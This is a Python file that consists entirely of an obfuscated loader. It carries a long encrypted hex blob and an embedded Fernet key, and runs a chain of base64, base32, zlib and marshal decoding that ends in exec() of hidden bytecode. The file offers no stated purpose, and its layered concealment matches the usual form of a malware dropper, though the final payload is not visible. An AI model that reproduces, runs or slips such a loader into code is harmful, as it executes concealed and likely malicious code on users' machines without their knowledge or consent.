__VareObfuscator__ = ''
import base64 as ______;import marshal as ____;import zlib as __________;from cryptography.fernet import Fernet;import base64;__mikey__="MlJhOWJYSDlXZnlhWlEtSzk3b3pCVXFBX3JmNlhvYXU5cFdCcTFkbVB1TT0=";mydata="674141414141426b4d757a5a6e782d4677626470686b7a50626245564453574a3572416c7a496c572d77554967696a456842483965494b5f55756e624e6978594d54796730634b2d765f4d5a55786d734f5834534c714a347138685071356e752d42556133584257322d6b31476c67774649705035625372384e656d4164494b66476a4259396654394c74705466474362745f68794146424847694b7044614a75496378314c5965595f46466e53747559573139362d6e6b54326b2d68583741632d4f564e5a58747336694e453877506273336f6e68696f5f6c693076326a564d75346d714759726a47422d664445695a6f3054533657373134714a6472736b6e65736770343955692d646171677162396f6c6642796d4d6f626f31635744792d4e707450776f4f46344467373179686c70393851766c69566c6d5a46696d784b48686433597638686f387a4730486d73557a3234344779736f7272503454724f366548644e59575f5f586252344166766d695f696e59694c48344c6d4b65313863324e62665f423045694e774b51416d6f7533634e645758437171726a7933567167497645716867766950526e67757344567653366e325477654f43707671336c546b5133363358536f77755673516f6a58786647735746484376506945634447355a4e3774536556764632444a6f37326c634a55714b7a656f494a713645626d4649553968736c777162506b726757506f71655a623750334242764345684578563131343977774470786e51633471376342654669476f5363787648514d4f497748544d623776667762633177593844386a61776a544e775741673452354362614146657061316b61427831755538396c45784732774d71725f362d32566e4a6753316e4231354d327770503647733076314551587739773969726d41486c5164546b38625f5150395f4551764b45333444317366527564754a6f6d757165316c673239516a6244336d6343315157644d5942454f6e6164614158495f5452555934636f30363638455a585439395645626f494d4457754f787068304732557a7955396f6f524933365f424e693371584351365167734b466e4b534a64346853356b7349615f6f6c65416937744c59554a356747765f725f38745165747842536a7734654f4172706b4c4f496e435a686e6a6b6f4c414855314b63385656364f5565543633347863646d7a342d4341786477387a556d554744456c536b63394348643076594e51617334766b667334727a796a31615452635049486a574377366561396b374a4651627549386f6d4c4b7356684d6550346b4c7357644931617a68616f5f415a736e79416f39554b586e755274374a54723342676b796851686b7a4965346d69354e62655751713776344d67594a626a5369454c727659515575774f5767793776353146316b524265633472613875476279785a6c505134424f50744570395153536364394a36534952796864367948664c77626a393749496662756645366e344850706973344f4a38344d4576643230456f42746d72756a4a5549444a62616549536b544e7649694a4e5058714e67315278585a6b6c496973776154435878387279645962654673327035315559437579534d63716357614751686932734c6a37315258487935516f3061394d74716d6b555776566174704f367879794f686b4f302d6b3548563456553179506477464779352d6b6d7666547264415444736679384a57473448473266566b492d34664a6c744674335972417532777146624a697632433966336b48574f334e463665726c63764577666d47336a762d7261446a30517a6e666977415771505938564a4a574a6e4c685532784a336757552d50516e71794f785159466b614a66574169473868587161324a367069344b5a565f704255415a6a35654f42445053655a424b4d5646394f5f796577686343346973536c3945587a6561622d6754786f343670324363766b757a74436b3668696c4b73572d476d7476573236715146304f62544c6b624f422d616b5f62794159585355425a5459426646734d4976704c6a4648454d496f35654e375967556642516b364159304e644968446f73646f7a513773685a656169716772627a77694d49484533745834744659424b34475a704946326a314c6d355456436d704c7546716e665f6f3166593270316e67797072324c4d302d7968543563564673416f52375a64464d4165534c584572414e56717a4e575535325a584870386d667574753356622d7136426a6566644957332d6c2d4c394e4a4778324557745263684258395a63416d49657a394632785672644d6538653936427833533274794c6f43694b686b784537704b3936713462595f3352385066385047334b66524c305a6c576836327a654a4f5f745f4946686c64367333545361415a304c4438746971545366476a6e7437644437434e7a62356c73493075513272556b2d57466932574c6b5063763332703435656e2d654979512d335164736c496d45334d75716b506a3561533164444c344d71666c704638534e6e475756345459454f4e756b2d68514363454b784277534478435255514b7a72706b6375576e5457363254546b594b49715f444f4573664656646e3865414f546c64534250555259646672433046574a357a6a726b633232655963585873787154746933367167725472504d2d6874506d444d475638303342624e704442465f30764b703478304c75336f5377356a6b576756384f354c354c654c3548426e726c2d544f4b756e784354455a796d464b4c434e2d3063776d5951453865386350576d704c53577832445f787839356d326e3774524f366c3064346d376b384d4d6f5f584a4d424246346b39594764695139774378474d3064714d4b644f6b6f5f3167464855794138614a726675317468513277425539466c4755506d5138376c75475a4262654c595442613979534c4a79336c613161747965325a6b586973495f75375a33484d6746684f7549696e58717574735a36314361413361623930686d4b4e66545a6f6532715749756879375759506c6d4965304f5f78436962515a6d796d34697a3658317362575f4c3749776c384b2d6c6d6f75376c4e385657556e36354454424667633154634875557041354e5561376c59416f5449614b3769305a56586271744c5a6d4235687475694469763250494770576856337333667765705a756b7943372d61596b543574394b695977766e426d523361704f5f30444f596a78684536744e34394d2d4347612d73756538702d55514138786c647a314d724437656d4b317155593330505a69545a4c435446684a4d51443963467464494e7859682d61716353476b69636c5270747a7471694d704e304f4966375f626747387343444730646473677659364f36357346384b4350324c676c394d5a684363774b6e766f363273336d4b61726163347a5269705a454b70782d527878574b627039757832662d5a77387a616e6f305f7870474e5973565f6c677853796d4e4c4f715846787249354638343234796b56505a37433031412d2d5454324e2d34305a76584d544f7378724b56625372525947615542415549754f71397a6a38734a55694d314e662d77314e743932776556716154704463656a636b462d505a315634666262616b57664b63646b4e773454592d55384d68714e365471564b644d68424753635779327569766f524b724d6c535a5a337a384c534944527a35724f4b6a70333251646e543367305654655a786d786145574c4b776738427434662d4f6f7664423841647867316b736f6c66324d30684f4c6b75326b53696f4f58746f387a583350572d684656526544614e71416835516f735a6e615f4178523254476b596b613755707153434968776b7375594c7a42733631727573536d50754858794d3139466c4c4c617a624763684e633057564d766d485f54716d4d474d417867736d45446e59574553487762676b66424b534c725852445f476f3275396b3965647a766c4e4a476853727a396b58436b676b69693439736b4e5874524739376856357635436e2d59736431674e6245623870436b555361636c684973386533777a45723144706b30543961796a74483375535265755a626c51726857305078343641774a65647552386e5a4a343164624f656a6a464f557039326d50417265427263745a2d66506d4861575a533733695347775a62617741673749394849364f50676f76616b6f37557a323679345a5f4f367572774548377531476d30383466536d6f44385a4c78524e7554334b7754436257462d5a3239495f444f66786b56324a3052316c376368616f46515173385f664d436f4a374c415449786b42645a6f395a2d4a4b4457766f75656f37767633635665556747616a6437476a414b56777257513032784b6a444f315f4633366c4661536374627741425262585664515a6c5a35722d68307a325a425f6a6a4b6766586b49326e62316c4631544265564f4177454e3957534e7a79435a766f626d79456964486a5a58326e4b6f7248636f47664b54415236594f5234305a645a4c4c5a6566466469484b367a486e59356454467230485a6b2d316468366a7050567938634a5a692d457a6273555333685930486a76466d4a4c697651656c42787432743056773837453343794f516a4e6742485a6864726c6753725349786974394e61575841306f623347576d323030314c315f6c44787a6d7738504e7a55654648443942526578736837377966314368306a6f416369505f375647746d7251357679556b705f38754f4f5a75324a46666c566c4f4a5258554f2d4b6534433933397354454637496d42317450707a6a7338665969734f5a67686166594476376675795365485a71746f696e334274356272486c78705341725a68584d6d63442d43326d34483054496d43656e6e5a3570736357372d626d635651343377346c4c61664c716e3032616c333476515f322d4346384843746765516e46726b364b634534393549386c39354e612d387875315364306d746149336d6545694c4435724a6b6f7a6b6d397049333452694a556b5432583452446c5649376853513267434a42432d4d7432306c636e503566697236756e77504b63797452327876495947496b356a45352d744d31376673313778307877704e4a4d7a5f73487445346e4b34516e7556324c62467041576a64794543556b6c755472707463533953384f3046516d4437796530354b6b757741544130416944464c584a6469516c56364a2d7334313663695972484d6a646d6e4832305a646633415a4a507452446d767969335370326b5a6c534642735474615546522d444857356d78666d394d70527a454c494a426b59304772395a73335f66544f6755357a58394d727148693679394576657736624656504e6656347a6250514c51634633436a4e74415f32394b666b734263365036303078384d697779583248714b5a4b7142622d33356a4d4a6d334b654b437a4a576b3373474f69644672386f4e686f6c6e4a69636c32787145572d4a664c31736d3748647259484f567039666638504c574b39316a3666476f6f62313546486237705a443070656c6f52664e32636765592d38733432327a514c44386c70617575493057502d364639503052336a74756c48776b534d744e7572614b426b656455746a476a4c57726d58546d437361534776767750424b76584979465a7734424b36694f596f32537768377255326c2d4e5a746f62676a467261784a67673149673454374c63397455336a4a437741574c2d6f5a624f324b7143387767565a3747336b7a4d3459416f4a625545454b636255546e4e676934504a445f703867724d3267715452516151377a65435732657671313776715a48646d4143786d396e495a7557496a3067674b5271596d326951516b704d666642566b7258633267787345653869536343586656576d2d5734352d52454f524f6479733975446a63795249775f49324657774175375f39654c5f6c4d436b6b65317431774e39504f4e6f556766503937616575484966737257664355576a336a5052546a41704f46426d735179574b6c5f4e56594d53366b396836484541655f5675784a7970686e4a78334c6246506d6155777441304f7646707666714e35626b3671547045335375494777395a7877316c47797336615866784343496e73587571797a784c37665f787035722d6649624a63666a44676b58664c52444c786a61676b416c355451436a434c37483977694e6e63343763395458544279415f645058726b6a57624f6b6f3473597a6d314a415949714c784b7436646133764a486b6d524969426b376b4d31364d4d4e615f484b46724b6f70665177486e547547785839524d4a4f6544705874745176564461754f30434868346d443546395155616c77427231614c57675f76494e6e584f50586c725f616b434557503330436c4f314d766d7674624e6b6a5f70303247436333762d57744d49437a59576b39396c6748484d44523466587964384c347136527a6579644367522d4d5648434d703068755f67456e7747677a7959526b4d465974704c4d37587254505848367857426e514b714a6d365a526364505745353431704142666e4c4c4c487967585056357a4139375661483858382d475163324d61764d625235526e7371687458614f6f716d414562675059304a6c4b66674d49386b736339565939346a446e52565561324f766f2d545748334b67554d41316c72305871345374746f715a48646d5a4c744d394967503652324d56457451514b4d466f6d454c497954685a544e6e55676f7a44534663464257564c563574637a655050625a70674b77734f754d38664631324a5935382d6a42524454387531324d5166477533627239364b6f58333172344b6779502d3767704231566a6a6e757973764737613656354a4b796849443364584f4f6c57693247365949705435375a483432715374736459512d514f44764d78425f366438714747364c31687631746b4f333249566a513d3d";__vare__ = lambda x: ____.loads(__________.decompress(______.b32decode(______.b64decode(x[::-1]))));__mycip__= Fernet(base64.b64decode(__mikey__));__step1__=bytes.fromhex(mydata);__step2__=__mycip__.decrypt(__step1__);__decr__=base64.b64decode(__step2__);__decrdata__=__decr__;__gotnew__=base64.b32decode(__decr__);__newdecr__=8777351751;__getnew__=__newdecr__;__myb64code__=base64.b64decode(__gotnew__);__myb64codee__=base64.b64decode(__myb64code__);___ = __myb64codee__;exec(__vare__(___))